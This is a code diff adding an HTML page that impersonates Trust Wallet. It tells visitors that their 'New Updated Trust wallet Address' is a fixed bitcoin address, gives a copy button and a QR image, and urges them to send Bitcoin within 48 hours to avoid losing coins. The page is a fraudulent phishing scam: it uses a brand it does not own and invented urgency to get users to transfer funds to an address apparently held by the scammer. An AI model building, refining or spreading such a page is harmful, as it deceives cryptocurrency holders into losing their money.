@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TRUST WALLET </title>
+
+    <!-- font awesome cdn link  -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
+<style>
+.tooltip {
+  position: relative;
+  display: inline-block;
+}
+
+.tooltip .tooltiptext {
+  visibility: hidden;
+  width: 140px;
+  background-color: #555;
+  color: #fff;
+  text-align: center;
+  border-radius: 6px;
+
+  padding: 5px;
+  position: absolute;
+  z-index: 1;
+  bottom: 150%;
+  left: 50%;
+  margin-left: -75px;
+  opacity: 0;
+  transition: opacity 0.3s;
+}
+
+.tooltip .tooltiptext::after {
+  content: "";
+  position: absolute;
+  top: 100%;
+  left: 50%;
+  margin-left: -5px;
+  border-width: 5px;
+  border-style: solid;
+  border-color: #555 transparent transparent transparent;
+}
+
+.tooltip:hover .tooltiptext {
+  visibility: visible;
+
+
+  opacity: 1;
+}
+</style>
+    <!-- custom css file link  -->
+    <link rel="stylesheet" href="style.css">
+
+	
+</head>
+<body>
+    
+<!-- header section starts  -->
+
+<header>
+
+    <a href="#" class="logo"><img src="images/logo.jpg" width="200" height="45" alt=""></a>
+
+  
+</header>
+
+<!-- header section ends -->
+
+<!-- home section starts  -->
+
+<section class="home" id="home">
+
+   
+
+    
+ <h3>   <br>
+    <br>
+    
+    <br
+</section>
+
+<!-- order section starts  -->
+
+<section class="order" id="order">
+
+    <h1 class="heading"> </h1>
+  
+ <div class="container">
+ 		<div class="label">
+ 				your New Updated Trust wallet Address is:
+ 		</div> <br>
+ 
+ 		<div class="copy-text">
+ 
+  
+  <input type="text" class="text" value="bc1q27vwv8r7dt6yatmdu37efjgquaqqg7nnrlpu4w" id="myInput"
+readonly>
+</div>
+
+<div class="tooltip">
+<button onclick="myFunction()" onmouseout="outFunc()"><br>
+  <span class="tooltiptext" id="myTooltip">Copy to clipboard</span>
+  
+<h  style="font-size:18px; color:red;"> Copy To Clipboard &nbsp;<i class="fa fa-clone" style="font-size:18px; color:red;"></i></h>
+  </button>
+</div>
+<br>
+<br>
+<script>
+
+function myFunction() {
+  var copyText = document.getElementById("myInput");
+  copyText.select();
+  copyText.setSelectionRange(0, 99999);
+  navigator.clipboard.writeText(copyText.value);
+  
+  var tooltip = document.getElementById("myTooltip");
+  tooltip.innerHTML = "Copied: " + copyText.value;
+}
+
+function outFunc() {
+  var tooltip = document.getElementById("myTooltip");
+  tooltip.innerHTML = "Copy to clipboard";
+
+}
+</script>
+<h5><b>NOTE:</b></h5><p> 1. Send Only<b> Bitcoin (btc)</b> to this address.<br>sending any other coins may result in permanent loss.</p>
+
+<p>2.  You have 48hours to transfer your Bitcoin (btc)</b> to this address.<br>To Avoid loss of Coins.</p>
+  
+
+
+
+
+    <div class="row">
+        <h1 class="heading">Scan </h1>
+    
+        <div class="image">
+            <img src="images/link.png" alt="">
+        </div>
+
+                            		</div>
+                 </div>
+
+</section>
+
+<!-- order section ends -->
+
+<!-- footer section  -->
+
+<section class="footer">
+
+    <div class="share">
+        <a href="#" class="btn">Home</a>
+        <a href="#" class="btn">Address</a>
+        <a href="https://www.trustwallet.com" class="btn">LogOut</a>
+     
+    </div>
+
+    <h1 class="credit"> www.trustwallet.com <span> </span> | all rights reserved! </h1>
+
+</section>
+
+<!-- scroll top button  -->
+<a href="hij.html" class="fas fa-angle-up" id="scroll-top"></a>
+
+<!-- loader  -->
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- custom js file link  -->
+<script src="script.js"></script>
+
+
+</body>
+</html>
